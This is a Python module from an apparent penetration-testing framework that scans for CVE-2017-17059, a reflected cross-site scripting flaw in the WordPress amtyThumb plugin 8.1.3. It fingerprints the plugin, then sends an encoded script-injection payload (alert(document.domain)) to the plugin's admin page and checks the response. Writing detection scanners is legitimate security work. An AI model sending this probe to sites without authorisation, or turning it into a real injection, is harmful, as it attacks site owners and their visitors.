#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress amty-thumb-recent-post plugin 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress amtyThumb Posts 8.1.3 - Cross-Site Scripting Detection',
        'description': 'WordPress amty-thumb-recent-post plugin 8.1.3 contains a cross-site scripting vulnerability via the query string to amtyThumbPostsAdminPg.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2017', 'cve', 'xss', 'wp-plugin', 'packetstorm', 'wordpress', 'amtythumb_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/NaturalIntelligence/wp-thumb-post/issues/1',
            'https://packetstormsecurity.com/files/145044/WordPress-amtyThumb-8.1.3-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-17059',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2017-17059',
    }

    def run(self):
        path = '/wp-content/plugins/amty-thumb-recent-post/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_all = ('amty thumb', 'tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/amty-thumb-recent-post/amtyThumbPostsAdminPg.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E=1'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='amty_hidden=1')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress amtyThumb Posts 8.1.3 - Cross-Site Scripting detected', path=path)
            return True
        return False

